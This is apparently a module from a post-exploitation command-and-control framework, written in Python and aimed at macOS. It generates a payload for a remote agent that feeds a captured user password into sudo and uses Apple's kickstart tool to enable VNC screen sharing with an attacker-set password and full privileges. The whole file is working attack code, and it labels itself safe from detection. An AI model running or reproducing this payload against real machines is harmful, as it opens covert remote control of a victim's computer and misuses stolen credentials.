from lib.common import helpers


class Module:

    def __init__(self, mainMenu, params=[]):

        # metadata info about the module, not modified during runtime
        self.info = {
            # name for the module that will appear in module menus
            'Name': 'ScreenSharing',

            # list of one or more authors for the module
            'Author': ['@n00py'],

            # more verbose multi-line description of the module
            'Description': ('Enables ScreenSharing to allow you to connect to the host via VNC.'),

            # True if the module needs to run in the background
            'Background' : False,

            # File extension to save the file as
            'OutputExtension' : "",

            # if the module needs administrative privileges
            'NeedsAdmin' : False,

            # True if the method doesn't touch disk/is reasonably opsec safe
            'OpsecSafe' : True,

            # the module language
            'Language' : 'python',

            # the minimum language version needed
            'MinLanguageVersion' : '2.6',

            # list of any references/other comments
            'Comments': ['https://www.unix-ninja.com/p/Enabling_macOS_screen_sharing_VNC_via_command_line']
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                'Description'   :   'Agent to execute module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Password' : {
                'Description'   :   'User password for sudo.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'VNCpass' : {
                'Description'   :   'Password to use for VNC',
                'Required'      :   True,
                'Value'         :   ''
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        # During instantiation, any settable option parameters
        #   are passed as an object set to the module and the
        #   options dictionary is automatically set. This is mostly
        #   in case options are passed on the command line
        if params:
            for param in params:
                # parameter format is [Name, Value]
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value

    def generate(self, obfuscate=False, obfuscationCommand=""):



        password = self.options['Password']['Value']
        vncpass = self.options['VNCpass']['Value']

        enable = "sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -activate -configure -access -on -clientopts -setvnclegacy -vnclegacy yes -clientopts -setvncpw -vncpw %s -restart -agent -privs -all"  % (vncpass)
        script = 'import subprocess; subprocess.Popen("echo \\"%s\\" | sudo -S %s", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)' % (password, enable)
        return script
